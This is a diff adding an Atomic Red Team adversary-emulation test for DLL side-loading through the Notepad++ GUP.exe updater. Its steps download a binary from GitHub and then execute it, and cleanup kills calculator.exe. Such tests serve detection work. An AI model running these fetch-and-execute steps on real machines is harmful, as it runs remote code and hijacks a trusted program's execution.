@@ -1,0 +1,20 @@
+#TechniqueName: Hijack Execution Flow: DLL Side-Loading
+#AtomicTestName: DLL Side-Loading using the Notepad++ GUP.exe binary
+#Language: cmd
+
+#get_prereq_commands
+New-Item -Type Directory (split-path PathToAtomicsFolder\T1574.002\bin\GUP.exe) -ErrorAction ignore | Out-Null
+Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/GUP.exe?raw=true" -OutFile "PathToAtomicsFolder\T1574.002\bin\GUP.exe"
+
+
+#prereq_commands
+if (Test-Path PathToAtomicsFolder\T1574.002\bin\GUP.exe) {exit 0} else {exit 1}
+
+
+#commands
+PathToAtomicsFolder\T1574.002\bin\GUP.exe
+
+
+#cleanup_commands
+taskkill /F /IM calculator.exe >nul 2>&1
+
